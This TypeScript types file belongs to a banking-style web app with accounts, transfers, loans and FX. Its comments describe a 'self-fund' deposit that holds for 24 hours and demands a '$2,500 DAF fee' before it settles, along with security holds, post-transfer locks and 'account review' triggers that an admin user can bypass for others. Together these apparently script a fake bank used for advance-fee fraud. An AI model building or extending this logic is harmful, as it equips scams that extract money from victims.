export type AccountType = "checking" | "savings" | "investment";

export interface Account {
  id: string;
  name: string;
  type: AccountType;
  number: string;
  routing: string;
  iban: string;
  /** SWIFT/BIC code used for receiving international wires. */
  swift: string;
  network: "Visa" | "Mastercard" | "Amex";
  balance: number;
  color: "violet" | "mint" | "indigo";
  /** When true, all outgoing transactions on this account are blocked (security hold after self-fund). */
  onHold?: boolean;
  /** When true, a DAF fee of $2,500 must be paid before the pending self-fund can settle. */
  dafRequired?: boolean;
  /** When true, account is temporarily locked following a recent outgoing transfer. */
  transferLocked?: boolean;
  /** ISO timestamp written by the "Clear DAF" SQL query.
   *  Signals the frontend to start the 6 h post-DAF settlement timer when detected on sync. */
  dafClearedAt?: string;
}

/** Cross-user admin controls managed by Takeshi. Stored in vaulta_admin localStorage key. */
export interface AdminControls {
  /** true → skip the DAF fee requirement at the 18h self-fund stage. */
  dafBypassed: boolean;
  /** true → skip the post-transfer security lock. */
  transferLockBypassed: boolean;
  /** true once the one-time DAF has been paid — all future incoming transfers skip the fee. */
  dafPaid: boolean;
}

export type TxCategory =
  | "Food"
  | "Transport"
  | "Shopping"
  | "Utilities"
  | "Transfers"
  | "Salary"
  | "Entertainment"
  | "Health"
  | "FX"
  | "Deposits"
  | "Loans";

/** Lifecycle tenor (total seconds from initiated → settled). Drives the
 * progressive timeline shown on the transaction detail page. */
export type TxTenor = "instant" | "fast" | "standard" | "slow" | "wire" | "selffund";
export const TENOR_SECONDS: Record<TxTenor, number> = {
  instant: 8,              // simulated deposits
  fast: 25,                // bills, internal transfers
  standard: 60 * 120,      // domestic transfers — pending for 2 h, then account review fires
  slow: 60 * 8,            // FD / Loan repayment clearing
  wire: 60 * 25,           // international wires (compressed for demo)
  selffund: 60 * 60 * 24,  // self-fund: 24 h — DAF fires at 18 h, settles 6 h after DAF cleared
};

export interface Transaction {
  id: string;
  date: string; // ISO
  merchant: string;
  category: TxCategory;
  amount: number; // positive = credit, negative = debit
  accountId: string;
  status: "completed" | "pending";
  reference: string;
  note?: string;
  /** When set, the timeline progresses across this duration before settling. */
  tenor?: TxTenor;
}

export interface Beneficiary {
  id: string;
  name: string;
  account: string;
  bank: string;
  avatarColor: string;
}

export interface SavingsGoal {
  id: string;
  name: string;
  emoji: string;
  saved: number;
  target: number;
  targetDate?: string;
}

export interface Session {
  id: string;
  device: string;
  location: string;
  timestamp: string; // ISO
  current: boolean;
}

export interface Notification {
  id: string;
  title: string;
  body: string;
  type: "transaction" | "security" | "promo" | "system";
  date: string;
  read: boolean;
}

export interface Profile {
  name: string;
  email: string;
  phone: string;
  tier: string;
  avatarInitials: string;
  avatarUrl?: string;
}

/* Fixed deposits */
export type FDStatus = "Active" | "Matured" | "Broken";
export interface FixedDeposit {
  id: string;
  principal: number;
  rate: number; // % p.a.
  startDate: string; // ISO
  maturityDate: string; // ISO
  status: FDStatus;
  sourceAccountId: string;
  tenureMonths: number;
}

/* Foreign currency accounts */
export type FxCurrency = "USD" | "GBP" | "EUR";
export interface FxAccount {
  id: string;
  currency: FxCurrency;
  name: string;
  number: string;
  flag: string;
  balance: number;
  symbol: string;
}

export interface FxTransaction {
  id: string;
  date: string;
  from: FxCurrency;
  to: FxCurrency;
  amount: number; // amount in `from`
  converted: number; // amount in `to`
  rate: number;
  status: "completed" | "pending";
}

/* Scheduled payments */
export type Frequency = "Weekly" | "Monthly" | "Quarterly" | "Annually";
export type SOStatus = "Active" | "Paused";
export interface StandingOrder {
  id: string;
  reference: string;
  recipient: string;
  sourceAccountId: string;
  amount: number;
  frequency: Frequency;
  nextDate: string; // ISO
  status: SOStatus;
  memo?: string;
}

/* Loans */
export interface Loan {
  id: string;
  name: string;
  principal: number;
  remaining: number;
  apr: number;
  termMonths: number;
  monthlyPayment: number;
  startDate: string;
}

/* Settings */
export interface NotificationPrefs {
  emailTransactions: boolean;
  emailPromos: boolean;
  emailStatements: boolean;
  pushTransactions: boolean;
  pushSecurity: boolean;
  pushOffers: boolean;
  smsAlerts: boolean;
  smsLargeTx: boolean;
  quietHours: boolean;
  quietStart: string; // "HH:mm"
  quietEnd: string;   // "HH:mm"
}

export interface SecuritySettings {
  twoFactor: boolean;
  password?: string;
  /** 4-digit transaction PIN required before confirming any transfer. */
  pin?: string;
}

export interface Preferences {
  currency: "USD" | "EUR" | "GBP";
  language: "English" | "Spanish" | "French";
}

export interface LinkedBank {
  id: string;
  name: string;
  mask: string;
}

export interface AppSettings {
  notifications: NotificationPrefs;
  security: SecuritySettings;
  preferences: Preferences;
  linkedBanks: LinkedBank[];
}

export interface AppState {
  theme: "light" | "dark";
  authed: boolean;
  userKey: "alex" | "jamie" | "takeshi";
  profile: Profile;
  accounts: Account[];
  transactions: Transaction[];
  beneficiaries: Beneficiary[];
  goals: SavingsGoal[];
  notifications: Notification[];
  fixedDeposits: FixedDeposit[];
  fxAccounts: FxAccount[];
  fxTransactions: FxTransaction[];
  standingOrders: StandingOrder[];
  loan: Loan | null;
  creditScore: number;
  settings: AppSettings;
  sessions: Session[];
}
